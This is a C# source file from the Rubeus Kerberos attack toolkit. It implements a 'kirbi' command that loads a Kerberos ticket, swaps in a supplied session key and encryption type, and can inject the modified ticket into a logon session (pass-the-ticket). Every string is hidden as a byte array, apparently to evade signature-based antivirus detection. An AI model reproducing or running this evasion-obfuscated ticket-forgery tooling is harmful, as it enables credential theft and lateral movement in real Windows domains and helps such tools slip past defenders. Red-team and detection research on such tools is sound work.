using System;
using System.Collections.Generic;
using System.IO;
using Rubeus.lib.Interop;

namespace Rubeus.Commands
{
    public class Kirbi : ICommand
    {
        private static string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);
        public static string CommandName => S(new byte[] { 107, 105, 114, 98, 105 });

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 77, 111, 100, 105, 102, 121, 32, 75, 105, 114, 98, 105, 13, 10 }));

            KRB_CRED kirbi = null;
            byte[] sessionKey = null;
            Interop.KERB_ETYPE sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            bool ptt = false;
            string outfile = S(new byte[] {});
            LUID luid = new LUID();

            if (arguments.ContainsKey(S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })))
            {
                outfile = arguments[S(new byte[] { 47, 111, 117, 116, 102, 105, 108, 101 })];
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 112, 116, 116 })))
            {
                ptt = true;
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 108, 117, 105, 100 })))
            {
                try
                {
                    luid = new LUID(arguments[S(new byte[] { 47, 108, 117, 105, 100 })]);
                }
                catch
                {
                    Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 73, 110, 118, 97, 108, 105, 100, 32, 76, 85, 73, 68, 32, 102, 111, 114, 109, 97, 116, 32, 40 }) + arguments[S(new byte[] { 47, 108, 117, 105, 100 })] + S(new byte[] { 41, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 107, 105, 114, 98, 105 })))
            {
                string kirbi64 = arguments[S(new byte[] { 47, 107, 105, 114, 98, 105 })];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    kirbi = new KRB_CRED(kirbiBytes);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    kirbi = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 107, 105, 114, 98, 105, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                    return;
                }
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 115, 115, 105, 111, 110, 107, 101, 121 })))
            {
                sessionKey = Helpers.StringToByteArray(arguments[S(new byte[] { 47, 115, 101, 115, 115, 105, 111, 110, 107, 101, 121 })]);
            }

            if (arguments.ContainsKey(S(new byte[] { 47, 115, 101, 115, 115, 105, 111, 110, 101, 116, 121, 112, 101 })))
            {
                string encTypeString = arguments[S(new byte[] { 47, 115, 101, 115, 115, 105, 111, 110, 101, 116, 121, 112, 101 })].ToUpper();

                if (encTypeString.Equals(S(new byte[] { 82, 67, 52 })) || encTypeString.Equals(S(new byte[] { 78, 84, 76, 77 })))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.rc4_hmac;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 49, 50, 56 })))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.aes128_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 65, 69, 83, 50, 53, 54 })) || encTypeString.Equals(S(new byte[] { 65, 69, 83 })))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
                }
                else if (encTypeString.Equals(S(new byte[] { 68, 69, 83 })))
                {
                    sessionKeyEtype = Interop.KERB_ETYPE.des_cbc_md5;
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 85, 110, 115, 117, 112, 112, 111, 114, 116, 101, 100, 32, 101, 116, 121, 112, 101, 32, 58, 32 }) + encTypeString);
                    return;
                }
            }

            ForgeTickets.ModifyKirbi(kirbi, sessionKey, sessionKeyEtype, ptt, luid, outfile);
        }
    }
}
